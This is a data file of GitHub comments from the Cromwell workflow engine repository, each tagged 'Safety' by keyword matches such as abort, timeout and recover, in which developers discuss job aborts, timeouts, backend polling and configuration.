Safety,"Currently the cromwell.conf file specifies the ARN of the queue that jobs; are submitted to. You can either change this to a new queue or you can; change the queue to use (or prioritize) a compute environment that uses on; demand instances. On Thu, Nov 19, 2020 at 2:32 PM Richard Davison <notifications@github.com>; wrote:. > If it works the same approach would allow for recovery in the case of Spot; > interruption; >; > By the way, speaking of this, how would I submit a job to an on-demand; > compute environment manually? It seems whenever I submit a workflow to; > cromwell, it always runs in a spot instance.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730590208>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EPPHWFJT3BFIOU2TCLSQVXFVANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-731151345:373,recover,recovery,373,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-731151345,1,['recover'],['recovery']
Safety,Didn't @aednichols increase the timeout for that very recently ?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-417771115:32,timeout,timeout,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-417771115,1,['timeout'],['timeout']
Safety,"Don't know the ticket for aborts - but yes we can confirm individual submissions/workflows, however it's tedious process and you need an admin to do it. Almost every time I've checked it's just a matter of statuses being incorrect and not that the machine is still running",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-335551347:26,abort,aborts,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-335551347,1,['abort'],['aborts']
Safety,"Er I meant ""safe"" where I said ""idempotent"", but still this should remain a POST. https://stackoverflow.com/questions/1254132/so-why-should-we-use-post-instead-of-get-for-posting-data",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2318#issuecomment-307442614:12,safe,safe,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2318#issuecomment-307442614,1,['safe'],['safe']
Safety,"Er, yes that was in a fork that I appear to have deleted... :flushed: although it wouldn't be useful as-is (was?) anymore because it was from back in the day when all the different sharedfilesystem backends were implemented in code, not defined in configuration as they are now. Last comment of @kshakir [above](https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-328880929) summarizes the situation perfectly for a within-cromwell solution. If I were going to work around this now I would `cron` up a simple script that:. 1. Makes API call to query the cromwell service for running jobs; 2. Finds all the corresponding `stdout.submit` files in the cromwell job task call execution directories to get scheduler job ids for the cromwell job; 3. Asks the scheduler for the alive-or-dead status of those scheduler job ids and if not alive, aborts the cromwell job via API call",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-360318578:853,abort,aborts,853,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-360318578,2,['abort'],['aborts']
Safety,FYI- This PR creates a new (and used) `akka.http.logger-startup-timeout`. You probaby want to override `akka.logger-startup-timeout` [specified here](https://github.com/akka/akka/blob/v2.5.31/akka-actor/src/main/resources/reference.conf#L31-L34). Stanza issues also explains why the `ReferenceConfSpec` during `9e20c40` didn't catch a collision. That commit tried-to-override-but-created `akka.actor.default-dispatcher.fork-join-executor.logger-startup-timeout`.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6381#issuecomment-870183224:64,timeout,timeout,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6381#issuecomment-870183224,3,['timeout'],['timeout']
Safety,"FYI- the failing test suite ""centaurJes"" is due to a know limitation in our test setup, but the other three look good, including the ""centaurLocal"" tests. Again, without a dockerized ""centaurTes"" we'll certainly try to avoid issues, but there won't be any guarantees that upgrades to the standard backend API don't break TES. Also, the 87 commits will need to be rebased and squashed correctly to a minimal set, on the order of 1 commit, but otherwise let us know when you're ready for re-review. Let us know if you have more questions or if we can provide any other assistance.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1816#issuecomment-278235897:219,avoid,avoid,219,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1816#issuecomment-278235897,1,['avoid'],['avoid']
Safety,"Feel free to make this PR redundant 😛 If your changes remove the need to put the outputs in a container override or does it in some different way that allows for larger values, then indeed this PR won't be needed anymore.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5447#issuecomment-627183681:26,redund,redundant,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5447#issuecomment-627183681,1,['redund'],['redundant']
Safety,Filed this PR to allow clients to wait for slow responses: ; https://github.com/broadinstitute/firecloud-develop/pull/1346. This may prevent people spamming the slow operation after seeing a timeout.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4105#issuecomment-422176768:191,timeout,timeout,191,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4105#issuecomment-422176768,1,['timeout'],['timeout']
Safety,"Fixed by https://github.com/broadinstitute/cromwell/pull/2808, the WEA doesn't bypass EJEAs anymore. When they receive an abort message they'll die if they don't have a BJEA.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1600#issuecomment-342586443:122,abort,abort,122,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1600#issuecomment-342586443,1,['abort'],['abort']
Safety,"For this particular case it might be an optimization, but from a general perspective I think it can be a design choice and would avoid creating new Workflow Actors-like",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195433266:129,avoid,avoid,129,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195433266,1,['avoid'],['avoid']
Safety,Found a good discussion. Will put it in a comment. https://stackoverflow.com/questions/442564/avoid-synchronizedthis-in-java,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4390#issuecomment-439102328:94,avoid,avoid-synchronizedthis-in-java,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4390#issuecomment-439102328,1,['avoid'],['avoid-synchronizedthis-in-java']
Safety,"Futures are fine, just not in the code which the actor itself directly controls - e.g. if an actor calls a function that lives elsewhere in our code, and internally that's using a Future, that's fine as it can't directly manipulate the actor's state (sort of - there's still an issue that the DB is a giant bit of shared mutable state, but that's harder to get around). I agree with your statement. My point is by making that claim that the burden is now on all future developers/reviewers/etc to notice if that actor somehow modifies beyond the ""oh, it's okay for now"" point. That's a lot easier said than done, better to prevent the pain from the get-go, it's not like the medicine is all that much extra work. edit: I'd also like for people to get in the habit of being extremely critical of futures inside an actor's event loop - requiring a strong defense of it as opposed to the opposite needing to be argued for. As you say, sometimes it's fine, but we should be critical at all times that it's _really_ a net win to do so. There's some psychology at work here - people see constructs and assume they're ok, the more we can avoid anti-patterns the less likely people are to misuse them.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/818#issuecomment-218579639:1131,avoid,avoid,1131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/818#issuecomment-218579639,1,['avoid'],['avoid']
Safety,"Good catch! I closed #2281. . Transferring conversation here:; From @MatthewMah ; > When running jobs on backends with job runtime limits such as LSF or SLURM, jobs reaching the runtime limits are killed by the backend. [Cromwell never detects that this occurs](http://gatkforums.broadinstitute.org/wdl/discussion/9542/does-cromwell-detect-task-failures-based-on-check-alive), and will wait forever for a job that is already dead. It would be helpful to configure periodic checks for whether tasks are still alive, and enter failure modes for non-zero return codes when unfinished tasks are no longer alive. . From @geoffjentry ; > @katevoss if I managed to correlate this correctly w/ the previous issue I was discussing w/ @kshakir it sounded like it isn't a huge deal, just that there's some nuance to it. From @cjllanwarne:; > Some SFS backends can kill jobs outside of Cromwell, leaving us waiting forever for an rc file that will never be created.; Idea: occasionally run the check-alive command to verify that long-running jobs are indeed still alive outside of restarting Cromwell.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-328126279:236,detect,detects,236,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-328126279,2,['detect'],"['detect-task-failures-based-on-check-alive', 'detects']"
Safety,Good news first: the `centaurPapiV2` build passed 🎉 ; Bad news: the other 4 PAPI v2 builds failed 😢 . The horicromtal builds are running with Cromwell configured to Carbonite but Centaur not configured to wait for Carboniting. While this might not have been intentional it's IMHO kind of appealing as a real-world scenario. I have no idea why the builds seem to hang until timeout as if some workflows were never completing. Conformance: `Unexpected failing tests: (6)`. No idea what happened with the engine upgrade test.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5237#issuecomment-548148305:373,timeout,timeout,373,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5237#issuecomment-548148305,1,['timeout'],['timeout']
Safety,"Good news, I was able to fix `StandardAsyncExecutionActor#requestsAbortAndDiesImmediately=false`. Turns out that when this flag is true, Cromwell blindly marks the job as aborted, now, Cromwell waits until the abort request is executed and the job can't be retrieved from GCP anymore.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2122548119:171,abort,aborted,171,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2122548119,2,['abort'],"['abort', 'aborted']"
Safety,"Here's a log for a similar workflow that had the same issue but recovered after restart. ```; 2017-02-13 16:50:09,104 INFO - MaterializeWorkflowDescriptorActor [UUID(3d01da76)]: Call-to-Backend assignments: test.hello -> JES; 2017-02-13 16:50:09,534 INFO - JES [UUID(3d01da76)]: Creating authentication file for workflow 3d01da76-98f9-4751-a3c0-efc61ef67030 at ; gs://cromwell-auth-broad-dsde-alpha/3d01da76-98f9-4751-a3c0-efc61ef67030_auth.json; 2017-02-13 16:50:10,063 INFO - WorkflowExecutionActor-3d01da76-98f9-4751-a3c0-efc61ef67030 [UUID(3d01da76)]: Starting calls: test.hello:NA:1; 2017-02-13 16:50:11,006 INFO - JesRun [UUID(3d01da76)test.hello:NA:1]: JES Run ID is operations/EJ7jhsOjKxiXht2Ej-qXrHAg9vy4-dodKg9wcm9kdWN0aW9uUXVldWU; 2017-02-13 16:50:11,006 INFO - JesAsyncBackendJobExecutionActor [UUID(3d01da76)test.hello:NA:1]: job id: operations/EJ7jhsOjKxiXht2Ej-qXrHAg9vy4-dodKg9wcm9kdWN0aW9uUXVldWU; 2017-02-13 16:50:16,621 INFO - JesAsyncBackendJobExecutionActor [UUID(3d01da76)test.hello:NA:1]: JesAsyncBackendJobExecutionActor [UUID(3d01da76):test.hello:NA:1] Status change from - to Initializing; 2017-02-13 16:51:01,890 INFO - JesAsyncBackendJobExecutionActor [UUID(3d01da76)test.hello:NA:1]: JesAsyncBackendJobExecutionActor [UUID(3d01da76):test.hello:NA:1] Status change from Initializing to Running; 2017-02-13 16:51:38,243 INFO - JesAsyncBackendJobExecutionActor [UUID(3d01da76)test.hello:NA:1]: JesAsyncBackendJobExecutionActor [UUID(3d01da76):test.hello:NA:1] Status change from Running to Success; 2017-02-13 16:51:38,977 INFO - WorkflowExecutionActor-3d01da76-98f9-4751-a3c0-efc61ef67030 [UUID(3d01da76)]: Workflow test complete. Final Outputs:; {; ""test.hello.response"": ""gs://fc-cd1f5468-d0f9-4416-8cdc-9464482022dd/8ee1f938-a92c-48df-a4cc-7a0683413547/test/3d01da76-98f9-4751-a3c0-efc61ef67030/call-hello/hello-stdout.log""; }; 2017-02-13 16:51:39,178 INFO - $f [UUID(3d01da76)]: Copying workflow logs from /cromwell-workflow-logs/workflow.3d01da76-98f9-4751-a3c0-efc61ef",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1978#issuecomment-279495953:64,recover,recovered,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1978#issuecomment-279495953,1,['recover'],['recovered']
Safety,"Hey @antonkulaga, these aren't exactly what you're after but there are two things you could have a look at that should help:; - You can use the `concurrent-job-limit` for the local backend to limit how many jobs (i.e. calls being run) are happening at any given time. That should cause things to slow down naturally without having to manually pause/resume them, which might help. In the config:; ```; backend {; ...; providers {; BackendName {; actor-factory = ...; config {; concurrent-job-limit = 5; ```. - The second item (not re-running early tasks) should be helped by [call caching](https://github.com/broadinstitute/cromwell#call-caching). As long as nothing changes in the intermediate steps, Cromwell should be able to detect and re-use your previous results.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2023#issuecomment-283395527:728,detect,detect,728,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2023#issuecomment-283395527,2,['detect'],['detect']
Safety,"Hey @gauravs90 - this looks like it shares a bit of work with the stuff I did in my #707 PR, trying to get message processing as far through the system as possible without backends. Luckily, you've focused in a different place (the actual validation) so combining/merging them shouldn't be too tough. The big differences I can see:; - I did the Materialization in a shadow actor to avoid interrupting the main one; - I moved backend assignment into my ShadowMaterializeWorkflowDescriptorActor; - MaterializeWorkflowDescriptorActor creates a data-only EngineWorkflowDescriptor. Literally just a BackendWorkflowDescriptor plus backend assignments. Having looked at your code though, I'm now unsure which is better; - It turned out I wasn't 100% correct first time so there was a lot of tidying up in the interfaces between the lifecycle states :-/ . Anyway, I've added you as a reviewer on my PR so you can have a look at what I've done - it'd be nice to try to work out where these things should go and maybe rebase or merge these PRs since they're making changes in similar places?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/709#issuecomment-210438658:382,avoid,avoid,382,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/709#issuecomment-210438658,1,['avoid'],['avoid']
Safety,Hey @patmagee -- a few questions:. 1. What version of Cromwell are you using? Is this behavior you're seeing as of recently? ; 2. Are you using the abort endpoint or killing operations from the Google Cloud console?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-395992525:148,abort,abort,148,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-395992525,1,['abort'],['abort']
Safety,"Hey @patmagee I'm able to reproduce this behavior today. We will look into why this is happening, there's a definitely some path that's not killing jobs upon abort.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-397628025:158,abort,abort,158,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-397628025,1,['abort'],['abort']
Safety,"Hey @rhpvorderman, that worked great for a bit so thanks for the comment! . I sometimes seem to be getting timeouts on smaller databases (300 seconds for a 2GB file), I think this might be due to Cromwell terminating incorrectly and it not starting up again. I'm following the SQLite with fingers crossed, and if there's anything I can do I'm more than happy to help.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-629961081:107,timeout,timeouts,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-629961081,1,['timeout'],['timeouts']
Safety,Hey @ruchim . I am using 31.1. And i aborted them with the rest endpoint first. But a day later vms were still running. Manually killing these caused the above behaviour,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-395998956:37,abort,aborted,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-395998956,1,['abort'],['aborted']
Safety,"Hey @samanehsan . Can you please explain what happens when you try and abort an on-hold workflow, what happens?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4311#issuecomment-433184701:71,abort,abort,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4311#issuecomment-433184701,1,['abort'],['abort']
Safety,"Hey Conrad - Thanks, this is awesome. To give some insight on how things are playing out in the hopefully-not-too-long-term, we're planning on cutting an alpha release of the PBE stuff imminently (perhaps today?) which is something we feel is stable enough to start poking at but is missing a few features we need in our production use cases (restart/recovery, call caching), backends other than local/JES, and with some known warts we need to hammer out. I'm guessing you're looking at roughly a month for something more stable than that, although I'm famous for my ""about a month"" predictions. However, since you're already pretty up to speed with what's going on, I'd say that the 0.20 alpha should be stable enough to work up a backend. It'd at least be a good test case as someone who _did_ figure out how to make one in the old system if the new system is inscrutable or not. In terms of what to do with this PR, I'll somewhat leave it up to you. We're hoping to close the 0.19 books as much as possible once the alpha thing is out, but if you feel like it'll provide value to folks over the next month or so I'm happy to take some time to review it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1106#issuecomment-229977813:351,recover,recovery,351,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1106#issuecomment-229977813,2,"['predict', 'recover']","['predictions', 'recovery']"
Safety,"Hey Patrick, I just ran a tiny test and was able to confirm jobs getting aborted. ; - How many jobs were started from your workflow, and did any of the jobs from your workflow abort?; - Do you have a general sense at the stage your jobs were on when they were aborted? Were they all mostly executing the command when you aborted them? ; - Did Cromwell ever report the workflow to have been successfully Aborted? Any errors thrown in the server logs?. Would you mind posting the operation metadata from one of the jobs that you tried aborting using the rest endpoint? Or simply the events reported for that operation?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-396002673:73,abort,aborted,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-396002673,11,"['Abort', 'abort']","['Aborted', 'abort', 'aborted', 'aborting']"
Safety,"Hey, not part of the Cromwell team but thought I'd try to help out. To clarify, you've:; - Built a Docker container with SGE + mysql; - Where `qsub` is not available through your `$PATH`, but installed at `/opt/gridengine/bin/lx-amd64/qsub`; - A (_virtual?_) SGE cluster is running within the container; - Running Cromwell inside this container; - Asking the cluster inside your docker container to spin up another Docker container. If this is correct, I'm struggling to understand the motivations behind it, but a few pointers:. - What does intermittent errors mean?; - You should avoid running Docker-in-Docker (SO: [Is it ok to run docker from inside docker?](https://stackoverflow.com/questions/27879713/is-it-ok-to-run-docker-from-inside-docker)); - It might be more predictable add `qsub` to the docker's path.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5334#issuecomment-571316484:582,avoid,avoid,582,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5334#issuecomment-571316484,2,"['avoid', 'predict']","['avoid', 'predictable']"
Safety,"Hi @EvanTheB could you check something for me - you should be seeing a message like `Cromwell will watch for an rc file *and* double-check every {} seconds to make sure this job is still alive` when you start your job? (assuming `INFO` level logging is enabled). Then, with that background polling ongoing throughout the job run, if a full iteration of `exit-poll-timeout` has passed since the job stopped running, Cromwell will then mark the job as failed. If that gives you enough to put something more helpful into the docs that would be awesome! If not, I can maybe clarify a bit more? Otherwise we should hopefully be able to cycle round to improving this documentation _eventually_ (though unfortunately I can't make any stronger promises on an ETA than that!)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-485806172:364,timeout,timeout,364,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-485806172,1,['timeout'],['timeout']
Safety,"Hi @TMiguelT, I worked on relative imports in Cromwell quite recently. The ideas about specifying the ""start point"" within the zip file did come up, but in the end people seemed more interested in relative HTTP imports (which is what I focussed on). I have two potential ideas for you which hopefully don't need Cromwell code changes. Hopefully these will help you - if not let us know!. ## Submit by URL. If you have a new version of Cromwell - since these changes were relatively recent - then you could try submitting the workflow to Cromwell by URL (based on your relative path, I'd guess the github hosted location you want would be https://raw.githubusercontent.com/h3abionet/h3agatk/1.0.1/workflows/GATK/GATK-complete-WES-Workflow-h3abionet.cwl). ## Call into the relatively nested file. If submit by URL is out, you could perhaps make a top level ""wrapper"" workflow which immediately imports and calls `workflows/GATK/GATK-complete-WES-Workflow-h3abionet.cwl`. This should let you access it while keeping it's location relative to the other files in the repo safe",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4505#issuecomment-449025212:1067,safe,safe,1067,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4505#issuecomment-449025212,1,['safe'],['safe']
Safety,"Hi @aednichols , ; Sorry for the long delay in response. This PR definitely fixes an issue that we found running Cromwell in AWS (see my description [above](https://github.com/broadinstitute/cromwell/pull/5216#issuecomment-543478047)). . I don't know if this scenario is covered in the existing tests. I had a quick look at the CI build and it looks to me as if the AWS CI Job is failing due to a job timeout, rather than actual tests failing. The last line in the log is:; > The job exceeded the maximum time limit for jobs, and has been terminated. The other successful jobs have the test results summary and an overall success message. Can you adjust the CI settings & run it again to see what the results are?. If this scenario is not actually covered by the existing tests, do I need to add an integration test in order to have the PR merged?. thanks; Ben",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5216#issuecomment-563012170:401,timeout,timeout,401,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5216#issuecomment-563012170,1,['timeout'],['timeout']
Safety,"Hi @cjllanwarne, thanks for the response! Actually, my examples passed validation by `wdltool`, but I justed tested them with the current version of `womtool` and they did not pass the validation, and the errors are meaningful. I think it's safe to dismiss the bug label now.; ```Unable to build WOM node for Scatter '$scatter_0': Unable to build WOM node for WdlTaskCall 'testtask': Cannot build expression for 'Test_optional.testtask.str = strings1[idx]': Invalid indexing target. You cannot index a value of type 'Array[String]?'```. ```Unable to build WOM node for Declaration 'num': Cannot build expression for 'Test_optional.num = length(strings1)': Unexpected arguments to function `length`. `length` takes a parameter of type Array but got: Success(WomOptionalType(WomMaybeEmptyArrayType(WomStringType)))```. ```Unable to build WOM node for Declaration 'string_pair': Cannot build expression for 'Test_optional.string_pair = zip(strings1, strings2)': Unexpected zip parameters: Vector(Success(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))), Success(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))))```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4218#issuecomment-428632555:241,safe,safe,241,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4218#issuecomment-428632555,1,['safe'],['safe']
Safety,"Hi @dgtester, thanks for this! . A few tidbits after a quick scan:; - In general Future is preferred over a raw Thread just because it plays nicer in the scala ecosystem; - Despite the fact that we do exactly this in a few places (bad us), you're really not supposed to be blocking on threads inside of actors - it has the potential to really gum up the works.; - The actor already has a notion of an internal state (NotRunning, Done, etc) that you should be able to leverage here. For instance (and I'm really making this up as I go along, so it's entirely likely to be not a good idea) you could have an Aborting state and when in that state it's waiting for the signal that currently is triggering the mutation on isDone",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-173733834:606,Abort,Aborting,606,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-173733834,1,['Abort'],['Aborting']
Safety,Hi @drkennetz - this seems quite similar in intent to an existing (opt-in) option for checking exit-code timeouts (https://cromwell.readthedocs.io/en/develop/backends/HPC/#exit-code-timeout). Since the timeout function would catch all failures (eg even if the script doesn't get a chance to trap the signal) I suspect it's more generally useful. What do you think?. cc @EvanTheB and @rhpvorderman since they probably know at least as much about why we went down the `exit-code-timeout` route as I do... 😄,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5107#issuecomment-519602956:105,timeout,timeouts,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5107#issuecomment-519602956,4,['timeout'],"['timeout', 'timeouts']"
Safety,"Hi @ffinfo would you might rolling back the `RetryAbortedJobs` changes and submitting them again as a separate PR? . I suspect that you're conflating `abort` as something external vs `abort` as something that Cromwell does itself (eg from a REST request or while it's shutting itself down) - and we need to be careful to get all of those interactions right - especially if this affects other backends. In any case, I think it's worth having it properly reviewed as its own change (rather than having it delay an otherwise approved PR 😄).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-427009938:151,abort,abort,151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-427009938,2,['abort'],['abort']
Safety,"Hi @ffinfo. I originally thought this was going to be a patch to just lower the rc polling verbosity, but you've begun tackling a much bigger issue. Thanks a bunch for your work so far!. We've also got a bunch of other work we're juggling at the moment, so it's unlikely I or others on the team will have time to look at this issue of disappearing SGE jobs in depth for at least a couple weeks. For now, here's a brain dump of notes. After a short bit of review, I'd perhaps try a different approach.; - On execute or recover, `scheduleOnce` a message back to `self` to later check if a job is alive.; - When the message is received check if the job is alive.; - If the job is alive `scheduleOnce` a message to check if the job is alive again.; - If the job is not alive write an rc file with `143` (or other code, see notes on configuration below).; - An instance of `cromwell.core.retry.Backoff` should travel inside the scheduled messages. Each time the message is to be scheduled, get the next time. As for the existing code, here are a few notes.; - Use `java.time` instead of `java.util`. `java.time.Instant` and `java.time.Duration` may be used to calculate the amount of time between two instants.; - `IsAliveCash.cash` should be `.cache`.; - `.map(_.cache).getOrElse(true)` should be `.forall(_.cache)`, however...; - `.cache` always appears to be `true`, and thus not needed.; - `!isAliveCache.contains` followed by `isAliveCache.get` should be `isAliveCache.getOrElseUpdate(job, IsAliveCache(Instant.now))`.; - There should be only one `SharedFileSystemJob` per `SharedFileSystemAsyncJobExecutionActor`. The reason the values are passed around is because the actor is also partially stateless, using `context.become` to track the `SharedFileSystemJob`. This PR adds state more to the actor, outside of the context, but that shouldn't be needed if the `isAlive` check is switched to running due to multiple `scheduleOnce` calls. The tests are likely timing out because the of the extra check",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243562238:518,recover,recover,518,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243562238,2,['recover'],['recover']
Safety,"Hi @jjackzhn, this is really more of a WDL question than a Cromwell question (and if you'd like to change how this works, there is an active community managing the WDL spec [here](https://github.com/openwdl/wdl)). In the meantime, you can convert any `X?` into a non-optional `X` by using `select_first` ([see docs](https://github.com/openwdl/wdl/blob/master/versions/1.0/SPEC.md#x-select_firstarrayx)). Here's your `scatter` example modified to include `select_first`:. ```wdl; Array[String]? strings. # Put 'strings' into an Array[Array[String]?] with one entry: [strings1]; # Then, select the first value in that array which is defined.; # (Note: the workflow will fail if strings is not defined!); Array[String] strings_not_optional = select_first([strings1]). scatter (str in strings_not_optional) { ; call testtask{ input: str = str }; }; ```. If you want to be safe in case the value is not supplied, you can wrap that into an `if`, but note that the output will also be optional now:. ```wdl; Array[String]? strings. if (defined(strings)) {; Array[String] strings_not_optional = select_first([strings1]). scatter (str in strings_not_optional) { ; call testtask{ input: str = str }; }; }. output {; # Let's imagine that testtask has a ""String out_string""; # Because it's wrapped in an 'if', it's now an optional output:; String? out_string = testtask.out_string; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4218#issuecomment-428327738:868,safe,safe,868,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4218#issuecomment-428327738,1,['safe'],['safe']
Safety,"Hi @katevoss I'm getting the same or very similar behaviour, running Cromwell 36. A job running on SGE finished at 18:55 but Cromwell didn't detect that it had finished until 9:50 the next morning. I could see the `rc` file in there with return code `0` while Cromwell still reported the job as `Running`. . This is a single, very low resource, 5 minute job, which runs right after a large (10k) scatter - don't know if that's really relevant though. It has happened twice in a row now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-444077848:141,detect,detect,141,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-444077848,1,['detect'],['detect']
